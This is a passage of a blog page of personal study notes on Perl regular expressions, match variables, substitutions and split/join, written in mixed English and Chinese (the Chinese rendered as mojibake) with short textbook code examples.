magical charaacters that need blackslashing in double quotes: <code>$</code> and <code>@</code>, <code>&quot;</code> and <code>\</code>.</p><h3 id="The-ENV-hash"><a href="#The-ENV-hash" class="headerlink" title="The %ENV hash"></a>The %ENV hash</h3><p>%ENV hash stores the info of environment.<br>You can see a PATH key in %ENV:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;PATH is <span class="hljs-variable">$ENV</span>&#123;PATH&#125;\n&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise"></a>Exercise</h2><p>The <code>chomp</code> function is vital to get input from <code>&lt;STDIN&gt;</code>.</p><p>ç»™å“ˆå¸Œèµ‹å€¼ä½¿ç”¨çš„æ˜¯<code>()</code>æ˜¯åˆ—è¡¨ï¼Œä½¿ç”¨å“ˆå¸Œçš„æ—¶å€™ç”¨<code>&#123;&#125;</code>èŠ±æ‹¬å·.</p><p>æŠŠæœªå®šä¹‰çš„å€¼å½“æˆæ•°å­—ä½¿ç”¨æ—¶ï¼ŒPerlä¼šè‡ªåŠ¨å°†å®ƒè½¬æ¢æˆ0.</p><p>ä¸èƒ½å¯¹å“ˆå¸Œä½¿ç”¨<code>push</code>ç­‰æ“ä½œã€‚</p><p>ä½¿ç”¨<code>my</code>å£°æ˜å¤šä¸ªå˜é‡ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">my</span>(<span class="hljs-variable">@words</span>, %count, $word);<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-7-Regular-Expressions"><a href="#CHAPTER-7-Regular-Expressions" class="headerlink" title="CHAPTER 7 Regular Expressions"></a>CHAPTER 7 Regular Expressions</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;yabba dabba doo&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/abba/</span>) &#123;<br>  print <span class="hljs-string">&quot;It matched!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å­—ç¬¦ä¸²ä¸­åŒ¹é…åˆ°å…¶ä¸­çš„ä¸€éƒ¨åˆ†ã€‚</p><p><mark>Interpolating</mark> a variable into a pattern:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">while</span> ( &lt;STDIN&gt; ) &#123;<br>   chomp;<br>   <span class="hljs-keyword">if</span> ( /<span class="hljs-variable">$ARGV</span>[0]/ ) &#123;<br>     <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\tMatches\n&quot;</span>;<br>   &#125;<br>   <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\tDoesn&#x27;t match\n&quot;</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-Wildcard"><a href="#The-Wildcard" class="headerlink" title="The Wildcard"></a>The Wildcard</h2><p>The dot <code>.</code> matches any single character except a newline. <code>\N</code>ä¹Ÿæœ‰åŒæ ·çš„æ•ˆæœã€‚</p><p>The backslash<code>\</code>ä¹Ÿæ˜¯metacharacter.</p><h2 id="Unicodeå±æ€§"><a href="#Unicodeå±æ€§" class="headerlink" title="Unicodeå±æ€§"></a>Unicodeå±æ€§</h2><p><mark>åŒ¹é…å±æ€§</mark></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">\p&#123;<span class="hljs-keyword">PROPERTY</span><span class="hljs-title"></span>&#125;<br></code></pre></td></tr></table></figure><p><code>p</code> æ”¹ä¸ºå¤§å†™è¡¨ç¤ºç›¸åçš„å«ä¹‰ã€‚ </p><h2 id="Quantifier"><a href="#Quantifier" class="headerlink" title="Quantifier"></a>Quantifier</h2><p>å¦‚<code>*</code>å’Œ<code>+</code>.</p><p><code>?</code>.</p><h2 id="Anchors"><a href="#Anchors" class="headerlink" title="Anchors"></a>Anchors</h2><p><code>\A</code> anchor matches at the absolute beginning of a string.</p><p><code>\z</code> matches the end of the string.<br><code>\Z</code> allows an optional newline after it.</p><p><code>^</code> caret, match the beginning of line.<br><code>$</code> match the end of line.</p><h3 id="Word-Anchors"><a href="#Word-Anchors" class="headerlink" title="Word Anchors"></a>Word Anchors</h3><p><code>\b</code>.</p><p>like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/\bfred\b/</span><br></code></pre></td></tr></table></figure><p>It matches at the start or end of a group of <code>\w</code> characters.</p><p>The <mark>nonword-boundary anchor</mark><br><code>\B</code>.</p><h2 id="æ¨¡å¼åˆ†ç»„"><a href="#æ¨¡å¼åˆ†ç»„" class="headerlink" title="æ¨¡å¼åˆ†ç»„"></a>æ¨¡å¼åˆ†ç»„</h2><p>ä½¿ç”¨å°æ‹¬å·<code>()</code>. åœ†æ‹¬å·ä¹Ÿæ˜¯å…ƒå­—ç¬¦ã€‚</p><p><mark>back reference</mark><br>ä¸ºä»€ä¹ˆå« back reference , å¯èƒ½æ˜¯è¦å¾€å›çœ‹æ‹¬å·é‡Œé¢çš„å†…å®¹ï¼Œæ‰€ä»¥æ˜¯â€œbackâ€.</p><p>ç”¨æ‹¬å·æ•è·ï¼Œåæ–œçº¿åŠ æ•°å­—å¼•ç”¨ã€‚å¼•ç”¨çš„å«ä¹‰æ˜¯å†æ¬¡åŒ¹é…æ‹¬å·çš„å†…å®¹ã€‚è¦å¿½ç•¥åµŒå¥—.</p><p>é€šè¿‡å·¦æ‹¬å·åˆ¤æ–­æ¬¡åºã€‚</p><p>æ–°çš„å†™æ³•ï¼š<code>\g&#123;N&#125;</code>, Nä¸ºç»„å·ã€‚ä½¿ç”¨perl5.10ã€‚</p><p><mark>relative back reference</mark>ç›¸å¯¹åå‘å¼•ç”¨ã€‚<br>ä½¿ç”¨è´Ÿæ•°ï¼Œä»å½“å‰ä½ç½®å¾€å‰æ•°.</p><h2 id="æ‹©ä¸€åŒ¹é…"><a href="#æ‹©ä¸€åŒ¹é…" class="headerlink" title="æ‹©ä¸€åŒ¹é…"></a>æ‹©ä¸€åŒ¹é…</h2><p>ç«–çº¿<code>|</code>.</p><h2 id="å­—ç¬¦é›†"><a href="#å­—ç¬¦é›†" class="headerlink" title="å­—ç¬¦é›†"></a>å­—ç¬¦é›†</h2><p>character class, <code>[]</code>.</p><p>è„±å­—ç¬¦<code>^</code>.</p><h2 id="å­—ç¬¦é›†çš„ç®€å†™"><a href="#å­—ç¬¦é›†çš„ç®€å†™" class="headerlink" title="å­—ç¬¦é›†çš„ç®€å†™"></a>å­—ç¬¦é›†çš„ç®€å†™</h2><p>å¦‚ <code>\d</code> è¡¨ç¤ºä»»æ„ä¸€ä¸ªæ•°å­—ã€‚</p><p><code>\R</code>åŒ¹é…ä»»æ„ä¸€ç§æ–­è¡Œç¬¦ã€‚</p><p><code>\w</code>åŒ¹é…å•è¯å­—ç¬¦ã€‚</p><p><code>\s</code>åŒ¹é…ç©ºç™½å­—ç¬¦ã€‚</p><h2 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise"></a>Exercise</h2><p>åå‘å¼•ç”¨å¼•ç”¨çš„æ˜¯åŒ¹é…åˆ°çš„å€¼ã€‚</p><h1 id="CHAPTER-8-Matching-with-Regular-Expressions"><a href="#CHAPTER-8-Matching-with-Regular-Expressions" class="headerlink" title="CHAPTER 8 Matching with Regular Expressions"></a>CHAPTER 8 Matching with Regular Expressions</h1><h2 id="Matches-with-m-x2F-x2F"><a href="#Matches-with-m-x2F-x2F" class="headerlink" title="Matches with m&#x2F;&#x2F;"></a>Matches with m&#x2F;&#x2F;</h2><p><code>/pattern/</code> is a short cut of <code>m/pattern/</code>, pattern match operator. æ¨¡å¼åŒ¹é…ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸åŒçš„åˆ†ç•Œç¬¦ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">m</span><span class="hljs-params">(fred)</span></span><br>m&lt;fred&gt;<br>m&#123;fred&#125;<br>...<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>/pattern/</code>å¯çœç•¥<code>m</code>.</p><h2 id="Match-Modifier"><a href="#Match-Modifier" class="headerlink" title="Match Modifier"></a>Match Modifier</h2><p>Sometimes called flags.</p><h3 id="Case-Insentive-Matching-with-i"><a href="#Case-Insentive-Matching-with-i" class="headerlink" title="Case-Insentive Matching with /i"></a>Case-Insentive Matching with <code>/i</code></h3><p>Using <code>/i</code> modifier.</p><h3 id="Matching-Any-Character-with-s"><a href="#Matching-Any-Character-with-s" class="headerlink" title="Matching Any Character with /s"></a>Matching Any Character with <code>/s</code></h3><p>è®©<code>.</code>èƒ½å¤ŸåŒ¹é…æ¢è¡Œç¬¦ã€‚Using <code>/s</code>.</p><p>v5.12æ–°å¢<code>\N</code>ä»£è¡¨<code>\n</code>çš„è¡¥é›†ã€‚</p><h3 id="Adding-Whitespace-with-x"><a href="#Adding-Whitespace-with-x" class="headerlink" title="Adding Whitespace with \x"></a>Adding Whitespace with <code>\x</code></h3><p>è®©æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„whitespaceä¸èµ·ä½œç”¨:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ -? [0-9]+ \.? [0-9] /</span>x<br></code></pre></td></tr></table></figure><p>ä¸ä¼šåŒ¹é…å…¶ä¸­çš„ç©ºæ ¼.å¦‚æœè¦åŒ¹é…whitespaceå¯ä»¥ä½¿ç”¨<code>\s</code>æˆ–escape a literal space.</p><h3 id="Combining-Option-Modifiers"><a href="#Combining-Option-Modifiers" class="headerlink" title="Combining Option Modifiers"></a>Combining Option Modifiers</h3><p>ä½¿ç”¨å¤šä¸ªmodifier, like:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/barney.*fred/i</span>s) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Choosing-a-Character-Interpretation"><a href="#Choosing-a-Character-Interpretation" class="headerlink" title="Choosing a Character Interpretation"></a>Choosing a Character Interpretation</h3><p>åœ¨ Perl v5.14 ä¸­æ·»åŠ çš„ç‰¹æ€§ï¼Œé€‰æ‹©è§£é‡Šæ–¹å¼like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/\w+/</span>a  <span class="hljs-comment">#use the ASCII interpretation of character classes</span><br><span class="hljs-regexp">/\w+/u</span>  <span class="hljs-comment">#use Unicode</span><br><span class="hljs-regexp">/\w+/</span>l  <span class="hljs-comment">#respect the locale</span><br></code></pre></td></tr></table></figure><p><mark>case fold</mark><br>In Unicode, lowercasing is not one-to-one.</p><p>åªå¯¹åº”ASCIIå­—ç¬¦çš„å¤§å°å†™:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/k/</span>aai<br></code></pre></td></tr></table></figure><p>ç”¨ä¸¤ä¸ª<code>\a</code>modifier.</p><p>ä½¿ç”¨<code>chr()</code> to ensure we get the right bit pattern regardless of the encoding issues:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = &lt;STDIN&gt;;<br><span class="hljs-keyword">my</span> $OE = <span class="hljs-keyword">chr</span>( <span class="hljs-number">0xBC</span> );<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/$OE/i</span>) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Found $OE\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Beginning-and-End-of-Line-Anchors"><a href="#Beginning-and-End-of-Line-Anchors" class="headerlink" title="Beginning and End-of-Line Anchors"></a>Beginning and End-of-Line Anchors</h3><p>å¦‚æœæ²¡æœ‰<code>\m</code>é‚£ä¹ˆ<code>^</code>å’Œ<code>$</code>å°±å’Œ<code>\A</code>å’Œ<code>\Z</code>ä¸€æ ·.</p><h2 id="The-Binding-Operator"><a href="#The-Binding-Operator" class="headerlink" title="The Binding Operator =~"></a>The Binding Operator <code>=~</code></h2><p>æ­£åˆ™è¡¨è¾¾å¼é»˜è®¤ä½œç”¨äº<code>$_</code>.</p><p>ä¸å†ä½¿ç”¨ default string , using <code>=~</code> tells Perl to match the pattern on the right against the string on the left:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">my</span> <span class="hljs-variable">$some_other</span> = <span class="hljs-string">&quot;I dream of betty rubbls,&quot;</span>;<br><span class="hljs-attribute">if</span> (<span class="hljs-variable">$some_other</span> =<span class="hljs-regexp">~ /\brub\b)</span> &#123;<br>  <span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Aye, there&#x27;s the rub.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>If thereâ€™s no binding operator, the expression uses <code>$_</code> by default.</p><p>åªæœ‰<code>&lt;STDIN&gt;</code>å•ç‹¬å‡ºç°åœ¨æ§åˆ¶è¯­å¥ä¸­ï¼Œ<code>$_</code>æ‰ä¼šè‡ªåŠ¨å­˜å‚¨.</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">my <span class="hljs-symbol">$li</span>kes_perl = &lt;STDIN&gt; =~ <span class="hljs-regexp">/\byes\b/i</span>;<br></code></pre></td></tr></table></figure><h2 id="The-Match-Variables"><a href="#The-Match-Variables" class="headerlink" title="The Match Variables"></a>The Match Variables</h2><p>Each regular expression capture holds part of the original string, not part of the pattern.</p><p>They are named like <code>$1</code>.</p><p><mark>The difference of <code>\4</code> and <code>$4</code></mark><br><code>\4</code> refers back to the capture during the pattern while it is trying to match.</p><p><code>$4</code> refers to the capture of an already completed pattern match.</p><p>ä¸€ä¸ªæ˜¯åŒ¹é…æ—¶ç”¨, ä¸€ä¸ªæ˜¯åŒ¹é…åç”¨.</p><p>Empty string å’Œ undef æ˜¯ä¸åŒçš„ï¼Œif you have three or fewer sets of parentheses in the pattern, $4 will be undef.</p><h2 id="The-Persistence-of-Captures"><a href="#The-Persistence-of-Captures" class="headerlink" title="The Persistence of Captures"></a>The Persistence of Captures</h2><p>These capture variables generally stay around until the next successful pattern match.</p><p>If you need a capture for more than a few lines, itâ€™s generally best to copy it into an ordinary variable.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $wilma_word = $1;<br></code></pre></td></tr></table></figure><h2 id="Noncapturing-Parentheses"><a href="#Noncapturing-Parentheses" class="headerlink" title="Noncapturing Parentheses"></a>Noncapturing Parentheses</h2><p>Adding <code>?:</code> after the opening parenthesis, which tell Perl you only want to use these parenthesis fo grouping.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(?:bronto)?saurus (steak|burger)/</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Fred wants a $1\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>\n</code>flag, which is added in v5.22, å¯ä»¥æŠŠæ‰€æœ‰æ‹¬å·è½¬æ¢ä¸ºnoncapturing groups.</p><p>å‘½åmatch variable, adding in Perl v5.10.<br>åŒ¹é…åˆ°çš„å†…å®¹å­˜æ”¾åœ¨hash<code>%+</code>ä¸­:</p><p>åœ¨regexä¸­ç”¨<code>?&lt;LABEL&gt;PATTERN</code> ä¹Ÿå°±æ˜¯æŒ‡å®šæ ‡è®°è€Œä¸æ˜¯ 1, 2, 3â€¦</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-attribute">my</span> <span class="hljs-variable">$names</span> = <span class="hljs-string">&#x27;Fred or Barney&#x27;</span>;<br><span class="hljs-attribute">if</span> ( <span class="hljs-variable">$names</span> =<span class="hljs-regexp">~ m/(?&lt;name1&gt;\w+)</span> (?:and|or) (?&lt;name2&gt;\w+)/) &#123;<br>  <span class="hljs-attribute">say</span> <span class="hljs-string">&quot;I saw $+&#123;name1&#125; and $+&#123;name2&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>\g&#123;lable&#125;</code> to back reference. å› ä¸ºæ²¡æœ‰æ•°å­—æ ‡è®°.</p><h2 id="The-Automatic-Match-Variables"><a href="#The-Automatic-Match-Variables" class="headerlink" title="The Automatic Match Variables"></a>The Automatic Match Variables</h2><p>ä¸ºäº†é¿å…å’Œè‡ªå·±å‘½åçš„å®¹æ˜“é‡åˆï¼Œmany of Perlâ€™s build-in variables å…·æœ‰å¥‡æ€ªçš„åå­—.</p><p>Three automatic match variables: <code>$&amp;</code>, <code>$ä¸Šé£˜</code> and <code>$&#39;</code>.</p><p><code>$&amp;</code> stores the actually matched pattern.</p><p><code>$ä¸Šé£˜</code> stores whatever came before the matched session. </p><p><code>$&#39;</code> stores whatever came after the matched session.</p><p>æ‰€ä»¥å°±æ˜¯å‰ä¸­å. They will stay around until the next successful pattern match. ä½¿ç”¨è¿™äº›automatic match variable ä¼šè®©ç¨‹åºå˜æ…¢.</p><p>åœ¨ v5.10 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œ å¯ä»¥é€šè¿‡æ·»åŠ  <code>/p</code> æ ‡è®°æ¥ä½¿ç”¨:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;^PREMATCH&#125;</span> <span class="hljs-variable">$&#123;^MATCH&#125;</span> <span class="hljs-variable">$&#123;^POSTMATCH&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Precedence"><a href="#Precedence" class="headerlink" title="Precedence"></a>Precedence</h2><p>å…³äºä¸¤ä¸ªä¹‹é—´çš„ç»“åˆã€‚</p><p>åªæœ‰å››ä¸ªlevel.</p><pre><code class="hljs">1.parentheses () 2.quantifier *, + and ?, &#123;n,m&#125;3.anchors and sequence \A, \Z, \z, ^, $, \b, \B4.vertical bar |5.so-called atoms</code></pre><h2 id="A-Pattern-Test-Program"><a href="#A-Pattern-Test-Program" class="headerlink" title="A Pattern Test Program"></a>A Pattern Test Program</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;    <span class="hljs-comment"># take one input line at a time</span><br>  <span class="hljs-keyword">chomp</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/YOUR_PATTERN_GOES_HERE/</span>) &#123;<br>     <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Matched: |$ä¸Šé£˜&lt;$&amp;&gt;$&#x27;|\n&quot;</span>;  <span class="hljs-comment"># the special match vars</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No match: |$_|\n&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise"></a>Exercise</h2><h1 id="CHAPTER-9-Processing-Text-with-Regular-Expressions"><a href="#CHAPTER-9-Processing-Text-with-Regular-Expressions" class="headerlink" title="CHAPTER 9 Processing Text with Regular Expressions"></a>CHAPTER 9 Processing Text with Regular Expressions</h1><h2 id="Substitutions-with-s-x2F-x2F-x2F"><a href="#Substitutions-with-s-x2F-x2F-x2F" class="headerlink" title="Substitutions with s&#x2F;&#x2F;&#x2F;"></a>Substitutions with s&#x2F;&#x2F;&#x2F;</h2><p>This simply replaces whatever part of a variable matches the pattern with a replacement string.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = <span class="hljs-string">&quot;He&#x27;s out bowing with Barney tonight.&quot;</span>;<br><span class="hljs-regexp">s/Barney/Fred/</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$_\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Using Boolean value to judge:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">$_ = <span class="hljs-string">&quot;fred flinnstone&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">s/fred/wilma/</span>) &#123;<br>   <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Successfully rep;aced fred with wilma.&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Globale-Replacements-with-x2F-g"><a href="#Globale-Replacements-with-x2F-g" class="headerlink" title="Globale Replacements with &#x2F;g"></a>Globale Replacements with &#x2F;g</h3><p>like:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">s</span>/\<span class="hljs-selector-tag">A</span>\<span class="hljs-selector-tag">s</span>+|\<span class="hljs-selector-tag">s</span>+\<span class="hljs-selector-tag">z</span><span class="hljs-comment">//g</span><br></code></pre></td></tr></table></figure><h3 id="Different-Delimiters"><a href="#Different-Delimiters" class="headerlink" title="Different Delimiters"></a>Different Delimiters</h3><p>Using <code>#</code> like:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">s<span class="hljs-meta">#\Ahttps:<span class="hljs-comment">//#http://#</span></span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æˆå¯¹çš„delimiterséœ€åˆ†åˆ«æ‹¬ä½:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">s</span><span class="hljs-template-variable">&#123;fred&#125;</span><span class="hljs-template-variable">&#123;barney&#125;</span><span class="language-xml">;</span><br></code></pre></td></tr></table></figure><h3 id="Nondestructive-Substitutions"><a href="#Nondestructive-Substitutions" class="headerlink" title="Nondestructive Substitutions"></a>Nondestructive Substitutions</h3><p>å¤åˆ¶ä¸€ä»½:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $original = <span class="hljs-string">&#x27;Fred ate 1 rid&#x27;</span>;<br><span class="hljs-keyword">my</span> $copy = $original;<br>$copy =~ <span class="hljs-regexp">s/\d+ ribs?/10 ribs/</span>;<br></code></pre></td></tr></table></figure><p>Adding in Perl 5.14, ä½¿ç”¨<code>\r</code>modifierå¯ä¿ç•™original strng alone and return a modified copy of it:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">14</span>;<br><br><span class="hljs-keyword">my</span> $copy = $original =~ <span class="hljs-regexp">s/\d+ ribs?/10 ribs/r</span>;<br></code></pre></td></tr></table></figure><p><code>=~</code> is higher precedence than the <code>=</code>.</p><h3 id="Case-Shifting"><a href="#Case-Shifting" class="headerlink" title="Case Shifting"></a>Case Shifting</h3><p>Using <code>\U</code> forces what follows to all uppercase:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;I saw Barney with Fred,&quot;</span>;<br>s<span class="hljs-regexp">/(fred|barney)/</span>\U<span class="hljs-variable">$1</span>/gi;<br></code></pre></td></tr></table></figure><p>The <code>\L</code> escape forces lowercase.</p><p>Turning off case shifting with <code>\E</code>.</p><p>When written in lowercase (<code>\l</code> and <code>\u</code>), they affect only the next character,</p><p>Using <code>\u</code> with <code>\L</code> means â€œall lowercase, but capitalize the first letter.â€.</p><p>These escape sequences are avaliable in any double-quotish string:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Hello, \L\u<span class="hljs-variable">$name</span>\E, would you like to play a game?\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Functions <code>lc</code>, <code>uc</code>, <code>fc</code>, <code>lcfirst</code>, and <code>ucfirst</code>. like:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $start = <span class="hljs-string">&quot;Fred&quot;</span>;<br><span class="hljs-keyword">my</span> $uncapp = <span class="hljs-keyword">lc</span>( $start );<br></code></pre></td></tr></table></figure><h3 id="Metaquoting"><a href="#Metaquoting" class="headerlink" title="Metaquoting"></a>Metaquoting</h3><p>å¤ªå¤šçš„backslashesä¼šå¾ˆä¹±ã€‚Using <code>\Q</code>å’Œ<code>\E</code>.</p><p><code>\Q</code> quote everything after it. ä¹Ÿå¯ä»¥ç”¨<code>quotemeta</code>function:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $profix = <span class="hljs-keyword">quotemeta</span>( $input_pattern );<br><span class="hljs-keyword">if</span> ( <span class="hljs-regexp">s/$prefix(Fred)/$1/</span> ) &#123;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Replaced $1\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="The-split-Operator"><a href="#The-split-Operator" class="headerlink" title="The split Operator"></a>The split Operator</h2><p>It looks like this:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @field = <span class="hljs-keyword">split</span> <span class="hljs-regexp">/separator/</span>, $string;<br></code></pre></td></tr></table></figure><p>å°±æ˜¯æ ¹æ®æŒ‡å®šçš„åˆ†éš”ç¬¦æ¥åˆ†å‰²ã€‚è¿”å›ä¸€ä¸ªlist.</p><p>ä¸€ä¸ªrule, leading empty fields are always returned, but trailing empty fields are discarded.</p><p>if you want the trailing empty field, give splite a third argument of -1.</p><p>The dafault for splite is to break up <code>$_</code> on whitespace:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @fields = <span class="hljs-keyword">split</span>;<br></code></pre></td></tr></table></figure><h2 id="The-join-Function"><a href="#The-join-Function" class="headerlink" title="The join Function"></a>The join Function</h2><p>The join function looks like this:</p><p><code>join</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯string.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $result = <span class="hljs-keyword">join</span> $glue, @pieces;<br></code></pre></td></tr></table></figure><p>ç”¨<code>$glue</code>ä¸­çš„å†…å®¹æ¥è¿æ¥<code>@pieces</code>ä¸­çš„å…ƒç´ . è¿”å›resulting string.</p><p>Using <code>split</code> and <code>join</code> to work together.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @values = <span class="hljs-keyword">split</span> <span class="hljs-regexp">/:/</span>, $x;<br><span 